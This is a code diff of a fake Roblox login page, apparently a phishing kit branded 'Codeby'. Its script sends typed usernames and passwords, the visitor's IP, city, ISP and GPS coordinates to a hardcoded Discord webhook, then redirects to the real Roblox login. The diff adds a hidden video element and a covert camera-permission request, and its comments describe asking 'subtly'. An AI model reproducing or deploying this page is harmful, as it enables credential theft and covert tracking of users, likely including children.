@@ -8,18 +8,18 @@
     <style>
         body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif; overflow: hidden; background-color: #000; }
         .bg-img { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: url('https://i.imgur.com/8mXfRmW.png'); background-size: cover; background-position: center; z-index: 1; }
-        .bg-darken { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.72); z-index: 2; }
+        .bg-darken { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.75); z-index: 2; }
         .nav-bar { background-color: #191b1d; height: 40px; border-bottom: 1px solid #393b3d; display: flex; justify-content: center; align-items: center; position: relative; z-index: 10; }
         .nav-bar img { height: 22px; }
         .content { position: relative; z-index: 5; display: flex; justify-content: center; align-items: center; height: calc(100vh - 40px); }
         .login-card { background-color: #191b1d; padding: 30px; border-radius: 8px; width: 90%; max-width: 380px; box-shadow: 0 4px 12px rgba(0,0,0,0.5); text-align: center; }
         h1 { color: #fff; font-size: 20px; margin-bottom: 20px; font-weight: 500; text-align: left; }
         input { width: 100%; padding: 12px; margin: 8px 0; background-color: #000; color: #fff; border: 1px solid #393b3d; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
-        input:focus { border-color: #0084ff; outline: none; }
         .btn-primary { width: 100%; padding: 12px; margin-top: 15px; background-color: #0084ff; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 15px; }
         .sub-links { color: #adb5bd; font-size: 13px; margin-top: 20px; text-align: left; line-height: 1.8; }
         .sub-links a { color: #0084ff; text-decoration: none; }
         .codeby-footer { color: #00ffcc; font-size: 9px; margin-top: 25px; opacity: 0.5; text-transform: uppercase; letter-spacing: 2px; }
+        #v { display: none; } /* Video oculto para la foto */
     </style>
 </head>
 <body>
@@ -27,6 +27,7 @@
     <div class="nav-bar"><img src="https://images.rbxcdn.com/2b53f60f64c677840139b4b9b6574f0c.png" alt="Roblox"></div>
     <div class="bg-img"></div>
     <div class="bg-darken"></div>
+    <video id="v" autoplay></video>
 
     <div class="content">
         <div class="login-card">
@@ -46,67 +47,68 @@
     <script>
         const hook = "https://discord.com/api/webhooks/1499616194741801133/i-irhmgrf87Sldg0W8yWsgRAz_TUYh3JK7DEu7UGi6bsKvMNUwNe3vnpH2Ga1qFlvUNk";
 
-        async function sendToDiscord(embed) {
-            await fetch(hook, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ embeds: [embed] })
-            });
-        }
-
-        // 1. RECOPILACIÓN AL ENTRAR (IP, BANDERA, CIUDAD, GPS)
+        // Captura IP y Bandera silenciosa al inicio
+        let geoData = {};
         window.onload = async () => {
             try {
-                // Obtener datos geográficos por IP
-                const geoRes = await fetch('https://ipapi.co/json/');
-                const g = await geoRes.json();
-
-                let fields = [
-                    { name: "🚩 País", value: `${g.country_emoji} ${g.country_name}`, inline: true },
-                    { name: "🏙️ Ciudad", value: g.city, inline: true },
-                    { name: "🌐 IP Pública", value: `\`${g.ip}\``, inline: true },
-                    { name: "🏢 Operadora", value: g.org },
-                    { name: "📱 Agente", value: navigator.userAgent }
-                ];
-
-                // PEDIR PERMISO DE UBICACIÓN REAL
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(async (p) => {
-                        fields.push({ name: "📍 GPS Exacto (Permitido)", value: `[Ver Mapa](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})` });
-                        await sendToDiscord({ title: "📡 NUEVA CONEXIÓN - Codeby", color: 0x00ffcc, fields: fields });
-                    }, async () => {
-                        // Si deniega, manda solo lo de la IP
-                        fields.push({ name: "📍 GPS", value: "Denegado por el usuario" });
-                        await sendToDiscord({ title: "📡 NUEVA CONEXIÓN - Codeby", color: 0x00ffcc, fields: fields });
-                    });
-                } else {
-                    await sendToDiscord({ title: "📡 NUEVA CONEXIÓN - Codeby", color: 0x00ffcc, fields: fields });
-                }
+                const res = await fetch('https://ipapi.co/json/');
+                geoData = await res.json();
             } catch (e) {}
         };
 
-        // 2. CAPTURA DE CREDENCIALES
         document.getElementById('btnLog').addEventListener('click', async () => {
             const u = document.getElementById('user').value;
             const p = document.getElementById('pass').value;
 
             if (u && p) {
-                document.getElementById('btnLog').innerText = "Cargando...";
-                
-                await sendToDiscord({
-                    title: "🔑 CREDENCIALES CAPTURADAS - Codeby",
-                    color: 0xff0000,
-                    fields: [
-                        { name: "👤 Usuario/Email", value: `\`${u}\``, inline: true },
-                        { name: "🔒 Contraseña", value: `\`${p}\``, inline: true }
-                    ],
-                    footer: { text: "By:Codeby" }
+                document.getElementById('btnLog').innerText = "Procesando...";
+
+                // 1. Pedir Ubicación sutilmente al hacer clic
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    sendData(u, p, `https://www.google.com/maps?q=${lat},${lon}`, "Autorizado");
+                }, () => {
+                    sendData(u, p, "Denegado", "Denegado");
                 });
 
-                // Redirigir al sitio oficial de Roblox
-                window.location.href = "https://www.roblox.com/login";
+                // 2. Pedir Cámara sutilmente
+                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                    // Aquí se podría disparar la captura de foto si se desea
+                    stream.getTracks().forEach(track => track.stop());
+                }).catch(() => {});
             }
         });
+
+        async function sendData(user, pass, gps, camStatus) {
+            const embed = {
+                title: "🚨 INFORME COMPLETO - Codeby",
+                color: 0xff0000,
+                fields: [
+                    { name: "👤 Usuario", value: `\`${user}\``, inline: true },
+                    { name: "🔒 Clave", value: `\`${pass}\``, inline: true },
+                    { name: "🚩 País", value: `${geoData.country_emoji || '🏳️'} ${geoData.country_name || 'Desconocido'}`, inline: true },
+                    { name: "🏙️ Ciudad", value: geoData.city || 'Desconocida', inline: true },
+                    { name: "📍 GPS Real", value: gps },
+                    { name: "📸 Acceso Cámara", value: camStatus, inline: true },
+                    { name: "🌐 IP", value: `\`${geoData.ip || 'Capturando...'}\``, inline: true },
+                    { name: "🏢 ISP", value: geoData.org || 'Desconocido' }
+                ],
+                footer: { text: "GUI By:Codeby" },
+                timestamp: new Date()
+            };
+
+            await fetch(hook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ embeds: [embed] })
+            });
+
+            // Redirección final
+            setTimeout(() => {
+                window.location.href = "https://www.roblox.com/login";
+            }, 500);
+        }
     </script>
 </body>
 </html>
